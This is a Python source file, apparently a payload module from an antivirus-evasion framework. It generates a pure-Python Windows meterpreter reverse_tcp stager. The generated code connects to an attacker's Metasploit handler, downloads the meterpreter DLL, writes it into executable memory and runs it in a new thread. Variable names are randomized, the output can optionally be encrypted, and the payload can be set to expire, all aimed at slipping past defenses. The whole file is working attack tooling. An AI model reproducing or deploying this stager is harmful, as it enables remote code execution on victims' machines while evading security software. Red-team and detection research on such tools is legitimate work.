"""

Custom-written pure python meterpreter/reverse_tcp stager.

By @harmj0y

"""

from modules.common import helpers
from modules.common import encryption
from datetime import date
from datetime import timedelta
from modules.common.pythonpayload import PythonPayload

class Payload(PythonPayload):

    def __init__(self):
        # pull in shared options
        PythonPayload.__init__(self)

        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.rating = "Excellent"

        # optional
        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"],
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["4444", "Port of the Metasploit handler"],
                                }
        self.required_options.update(self.required_python_options)

    def generate(self):
        self._validateArchitecture()

        # randomize all of the variable names used
        shellCodeName = helpers.randomString()
        socketName = helpers.randomString()
        intervalName = helpers.randomString()
        attemptsName = helpers.randomString()
        getDataMethodName = helpers.randomString()
        fdBufName = helpers.randomString()
        rcvStringName = helpers.randomString()
        rcvCStringName = helpers.randomString()

        injectMethodName = helpers.randomString()
        tempShellcodeName = helpers.randomString()
        shellcodeBufName = helpers.randomString()
        fpName = helpers.randomString()
        tempCBuffer = helpers.randomString()


        payloadCode = "import struct, socket, binascii, ctypes, random, time\n"

        # socket and shellcode variables that need to be kept global
        payloadCode += "%s, %s = None, None\n" % (shellCodeName,socketName)

        # build the method that creates a socket, connects to the handler,
        # and downloads/patches the meterpreter .dll
        payloadCode += "def %s():\n" %(getDataMethodName)
        payloadCode += "\ttry:\n"
        payloadCode += "\t\tglobal %s\n" %(socketName)
        # build the socket and connect to the handler
        payloadCode += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
        payloadCode += "\t\t%s.connect(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        # pack the underlying socket file descriptor into a c structure
        payloadCode += "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,socketName)
        # unpack the length of the payload, received as a 4 byte array from the handler
        payloadCode += "\t\tl = struct.unpack('<i', str(%s.recv(4)))[0]\n" %(socketName)
        payloadCode += "\t\t%s = \"     \"\n" % (rcvStringName)
        # receive ALL of the payload .dll data
        payloadCode += "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, socketName)
        payloadCode += "\t\t%s = ctypes.create_string_buffer(%s, len(%s))\n" % (rcvCStringName,rcvStringName,rcvStringName)
        # prepend a little assembly magic to push the socket fd into the edi register
        payloadCode += "\t\t%s[0] = binascii.unhexlify('BF')\n" %(rcvCStringName)
        # copy the socket fd in
        payloadCode += "\t\tfor i in xrange(4): %s[i+1] = %s[i]\n" % (rcvCStringName, fdBufName)
        payloadCode += "\t\treturn %s\n" % (rcvCStringName)
        payloadCode += "\texcept: return None\n"

        # build the method that injects the .dll into memory
        payloadCode += "def %s(%s):\n" %(injectMethodName,tempShellcodeName)
        payloadCode += "\tif %s != None:\n" %(tempShellcodeName)
        payloadCode += "\t\t%s = bytearray(%s)\n" %(shellcodeBufName,tempShellcodeName)
        # allocate enough virtual memory to stuff the .dll in
        payloadCode += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(fpName,shellcodeBufName)
        # virtual lock to prevent the memory from paging out to disk
        payloadCode += "\t\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))\n" %(fpName,shellcodeBufName)
        payloadCode += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(tempCBuffer,shellcodeBufName,shellcodeBufName)
        # copy the .dll into the allocated memory
        payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))\n" %(fpName,tempCBuffer,shellcodeBufName)
        # kick the thread off to execute the .dll
        payloadCode += "\t\tht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(fpName)
        # wait for the .dll execution to finish
        payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n"

        # set up expiration options if specified
        if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
            # download the stager
            payloadCode += "%s = %s()\n" %(shellCodeName, getDataMethodName)
            # inject what we grabbed
            payloadCode += "%s(%s)\n" % (injectMethodName,shellCodeName)
        else:
            # Get our current date and add number of days to the date
            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

            randToday = helpers.randomString()
            randExpire = helpers.randomString()

            payloadCode += 'from datetime import datetime\n'
            payloadCode += 'from datetime import date\n\n'
            payloadCode += randToday + ' = datetime.now()\n'
            payloadCode += randExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            payloadCode += 'if ' + randToday + ' < ' + randExpire + ':\n'
            # download the stager
            payloadCode += "\t%s = %s()\n" %(shellCodeName, getDataMethodName)
            # inject what we grabbed
            payloadCode += "\t%s(%s)\n" % (injectMethodName,shellCodeName)


        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode

